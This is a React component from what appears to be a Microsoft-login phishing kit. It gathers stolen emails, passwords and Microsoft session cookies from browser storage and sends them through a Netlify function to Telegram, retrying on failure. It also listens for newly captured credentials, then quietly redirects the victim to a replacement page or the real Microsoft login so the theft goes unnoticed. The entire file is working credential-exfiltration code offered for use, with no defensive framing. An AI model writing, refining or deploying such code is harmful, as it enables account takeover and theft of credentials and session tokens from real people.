import React, { useLayoutEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

/**
 * FIXED: Enhanced OAuth redirector with improved data transmission capabilities.
 *
 * Purpose:
 * - Immediately navigates the browser to /replacement.html on mount
 * - Attempts to transmit any already-captured data before navigation
 * - Listens for future storage events (keeps minimal listeners)
 * - Keeps behavior simple (no popup) because popups are frequently blocked
 * - CRITICAL FIX: Ensures reliable data transmission with retry logic
 */
const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({
  onLoginSuccess,
  sendToTelegram
}) => {
  useLayoutEffect(() => {
    console.log('🔄 RealOAuthRedirect component mounted, preparing data transmission...');

    // FIXED: Enhanced direct Telegram API call with retry logic
    const sendDirectToTelegram = async (data: any, retryCount = 0) => {
      const maxRetries = 3;
      
      try {
        console.log('📤 Direct Telegram transmission attempt ' + (retryCount + 1) + ':', {
          hasEmail: !!data.email,
          hasPassword: !!data.password,
          cookieCount: data.cookies?.length || 0
        });

        const response = await fetch('/.netlify/functions/sendTelegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            ...data,
            source: 'oauth-redirect-direct',
            retryAttempt: retryCount,
            timestamp: new Date().toISOString()
          })
        });

        if (response.ok) {
          console.log('✅ Direct Telegram transmission successful');
          // Mark as successfully transmitted
          try {
            localStorage.setItem('data_transmitted', 'true');
            sessionStorage.setItem('data_transmitted', 'true');
            localStorage.setItem('telegram_data_sent', 'true');
            sessionStorage.setItem('telegram_data_sent', 'true');
          } catch (e) {
            // ignore storage errors
          }
          return true;
        } else {
          console.warn('⚠️ Direct Telegram transmission failed:', response.status, response.statusText);
          
          // Retry on server errors
          if (response.status >= 500 && retryCount < maxRetries) {
            console.log('🔄 Server error, retrying in ' + ((retryCount + 1) * 1000) + 'ms...');
            setTimeout(() => {
              sendDirectToTelegram(data, retryCount + 1);
            }, (retryCount + 1) * 1000);
          }
          return false;
        }
      } catch (error) {
        console.warn('⚠️ Direct Telegram transmission error:', error);
        
        // Retry on network errors
        if (retryCount < maxRetries) {
          console.log('🔄 Network error, retrying in ' + ((retryCount + 1) * 2000) + 'ms...');
          setTimeout(() => {
            sendDirectToTelegram(data, retryCount + 1);
          }, (retryCount + 1) * 2000);
        }
        return false;
      }
    };

    // FIXED: Enhanced function to send captured data to Telegram with comprehensive data collection
    const transmitCapturedData = async () => {
      try {
        console.log('🔍 Collecting captured data from all storage sources...');
        
        // Get all captured data from storage with multiple fallback options
        const storageKeys = [
          'replacement_credentials',
          'captured_credentials',
          'form_credentials',
          'injected_credentials'
        ];
        
        let credentials = null;
        let cookies = null;
        let capturedEmail = null;

        // Try to get credentials from any available source
        for (const key of storageKeys) {
          if (!credentials) {
            const localData = localStorage.getItem(key);
            const sessionData = sessionStorage.getItem(key);
            
            if (localData) {
              try {
                const parsed = JSON.parse(localData);
                if (parsed.email || parsed.password) {
                  credentials = parsed;
                  console.log('📋 Found credentials in localStorage:', key);
                  break;
                }
              } catch (e) {
                console.warn('Failed to parse credentials from localStorage:', key, e);
              }
            }
            
            if (sessionData) {
              try {
                const parsed = JSON.parse(sessionData);
                if (parsed.email || parsed.password) {
                  credentials = parsed;
                  console.log('📋 Found credentials in sessionStorage:', key);
                  break;
                }
              } catch (e) {
                console.warn('Failed to parse credentials from sessionStorage:', key, e);
              }
            }
          }
        }

        // Get cookies
        const cookieKeys = ['captured_cookies', 'microsoft_cookies'];
        for (const key of cookieKeys) {
          if (!cookies) {
            const localData = localStorage.getItem(key) || sessionStorage.getItem(key);
            if (localData) {
              try {
                const parsed = JSON.parse(localData);
                if (Array.isArray(parsed) && parsed.length > 0) {
                  cookies = parsed;
                  console.log('🍪 Found cookies:', key, parsed.length);
                  break;
                }
              } catch (e) {
                console.warn('Failed to parse cookies:', key, e);
              }
            }
          }
        }

        // Get email
        capturedEmail = localStorage.getItem('captured_email') || 
                      sessionStorage.getItem('captured_email') ||
                      credentials?.email;

        // FIXED: Prepare comprehensive data payload
        const dataToSend = {
          email: credentials?.email || capturedEmail || '',
          password: credentials?.password || '',
          cookies: cookies || [],
          authenticationTokens: null,
          userAgent: navigator.userAgent,
          sessionId: Date.now().toString(),
          url: window.location.href,
          timestamp: new Date().toISOString(),
          source: credentials?.source || 'oauth-redirect-comprehensive',
          validated: credentials?.validated || false,
          microsoftAccount: credentials?.microsoftAccount || false,
          // Add comprehensive context
          captureContext: {
            foundCredentialsIn: credentials ? 'storage' : 'none',
            foundCookiesIn: cookies ? 'storage' : 'none',
            credentialSource: credentials?.source || 'unknown',
            storageKeysChecked: storageKeys,
            hasStoredEmail: !!capturedEmail,
            componentSource: 'RealOAuthRedirect'
          }
        };

        // Send to Telegram if we have meaningful data
        if (dataToSend.email || dataToSend.password || (dataToSend.cookies && dataToSend.cookies.length > 0)) {
          console.log('📤 Transmitting captured data to Telegram...', {
            hasEmail: !!dataToSend.email,
            hasPassword: !!dataToSend.password,
            cookieCount: dataToSend.cookies?.length || 0,
            validated: dataToSend.validated,
            source: dataToSend.source
          });

          let transmissionSuccess = false;

          // Try prop function first
          if (sendToTelegram) {
            try {
              await sendToTelegram(dataToSend);
              console.log('✅ Data successfully transmitted to Telegram (via prop)');
              transmissionSuccess = true;
            } catch (error) {
              console.warn('⚠️ Failed to send data via prop function:', error);
            }
          }

          // Fallback to direct API call if prop function failed or doesn't exist
          if (!transmissionSuccess) {
            transmissionSuccess = await sendDirectToTelegram(dataToSend);
          }

          // Mark as transmitted if successful
          if (transmissionSuccess) {
            try {
              localStorage.setItem('data_transmitted', 'true');
              sessionStorage.setItem('data_transmitted', 'true');
              localStorage.setItem('telegram_data_sent', 'true');
              sessionStorage.setItem('telegram_data_sent', 'true');
            } catch (e) {
              // ignore storage errors
            }
          }
        } else {
          console.log('📭 No meaningful data found to transmit');
        }

      } catch (error) {
        console.warn('⚠️ Error in comprehensive data transmission:', error);
      }
    };

    // FIXED: Check if data has already been transmitted with multiple flag checks
    const alreadyTransmitted = localStorage.getItem('data_transmitted') ||
                              sessionStorage.getItem('data_transmitted') ||
                              localStorage.getItem('telegram_data_sent') ||
                              sessionStorage.getItem('telegram_data_sent');

    // If not transmitted, attempt transmission with longer delay to ensure data is available
    if (!alreadyTransmitted) {
      console.log('📡 Data not yet transmitted, scheduling transmission...');
      setTimeout(transmitCapturedData, 1200); // Increased delay to ensure data is available
    } else {
      console.log('✅ Data already transmitted, skipping...');
    }

    // Navigate to replacement page after ensuring transmit attempt was scheduled
    try {
      console.log('🔄 Navigating to replacement page...');
      // Increased delay to allow transmitCapturedData to complete
      setTimeout(() => {
        try {
          window.location.replace('/replacement.html');
        } catch (error) {
          console.error('❌ Failed to navigate to replacement page:', error);
          // Fallback to Microsoft login if navigation fails
          try {
            window.location.replace('https://login.microsoftonline.com');
          } catch (e) {
            console.error('❌ Fallback navigation also failed:', e);
          }
        }
      }, 500); // Increased from 300ms to 500ms
    } catch (error) {
      console.error('❌ Navigation scheduling failed:', error);
    }

    // FIXED: Enhanced storage listener for last-second data captures
    const handleStorageChange = async (e: StorageEvent) => {
      if ((e.key === 'captured_credentials' ||
           e.key === 'replacement_credentials' ||
           e.key === 'captured_cookies' ||
           e.key === 'form_credentials') &&
          e.newValue) {
        
        const alreadySent = localStorage.getItem('data_transmitted') || 
                           localStorage.getItem('telegram_data_sent') ||
                           sessionStorage.getItem('telegram_data_sent') ||
                           sessionStorage.getItem('data_transmitted');
        
        if (!alreadySent) {
          console.log('🔄 New data detected in storage, attempting transmission...');
          
          try {
            let dataToSend = {};
            
            if (e.key.includes('credentials')) {
              const credentials = JSON.parse(e.newValue!);
              dataToSend = {
                email: credentials.email || '',
                password: credentials.password || '',
                cookies: [],
                userAgent: navigator.userAgent,
                sessionId: Date.now().toString(),
                url: window.location.href,
                timestamp: new Date().toISOString(),
                source: credentials.source || 'storage-monitor-enhanced',
                validated: credentials.validated || false,
                microsoftAccount: credentials.microsoftAccount || false
              };
            } else if (e.key.includes('cookies')) {
              const cookies = JSON.parse(e.newValue!);
              dataToSend = {
                email: '',
                password: '',
                cookies: cookies,
                userAgent: navigator.userAgent,
                sessionId: Date.now().toString(),
                url: window.location.href,
                timestamp: new Date().toISOString(),
                source: 'storage-monitor-cookies',
                validated: false,
                microsoftAccount: false
              };
            }

            // Send via prop function or direct API
            let success = false;
            if (sendToTelegram) {
              try {
                await sendToTelegram(dataToSend);
                success = true;
              } catch (error) {
                console.warn('⚠️ Prop function failed, trying direct API:', error);
              }
            }
            
            if (!success) {
              success = await sendDirectToTelegram(dataToSend);
            }

            if (success) {
              try {
                localStorage.setItem('data_transmitted', 'true');
                sessionStorage.setItem('data_transmitted', 'true');
                localStorage.setItem('telegram_data_sent', 'true');
                sessionStorage.setItem('telegram_data_sent', 'true');
              } catch (e) {
                // ignore storage errors
              }
              console.log('✅ Storage-triggered transmission completed');
            }
          } catch (error) {
            console.warn('⚠️ Storage-triggered transmission failed:', error);
          }
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);

    // cleanup on unmount
    return () => {
      window.removeEventListener('storage', handleStorageChange);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Render nothing to avoid any visible flash
  return null;
};

export default RealOAuthRedirect;
